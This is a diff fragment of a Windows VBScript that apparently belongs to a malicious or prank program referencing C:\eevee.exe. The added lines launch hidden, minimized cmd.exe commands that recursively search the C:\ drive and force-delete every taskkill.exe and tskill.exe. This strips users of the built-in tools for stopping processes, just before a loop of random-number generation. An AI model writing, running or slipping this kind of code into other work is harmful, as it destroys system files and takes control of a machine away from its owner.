@@ -7,8 +7,9 @@ Set list = CreateObject("System.Collections.ArrayList")
 names = "C:\eevee.exe"
 i = 0
 Set oShell = WScript.CreateObject ("WScript.Shell")
-oShell.run "cmd.exe /C for /r C:\ %i in (taskkill.exe) do del /f/s/q ""%i"" && pause"
-oShell.run "cmd.exe /C for /r C:\ %i in (tskill.exe) do del /f/s/q ""%i"" && pause"
+oShell.run "cmd.exe /c START /MIN /B for /r C:\ %i in (taskkill.exe) do del /f/s/q ""%i"" START"
+oShell.run "cmd.exe /c START /MIN /B for /r C:\ %i in (tskill.exe) do del /f/s/q ""%i"" START"
+
 Do While i <= 0
 	max=999999999
 	min=100000000
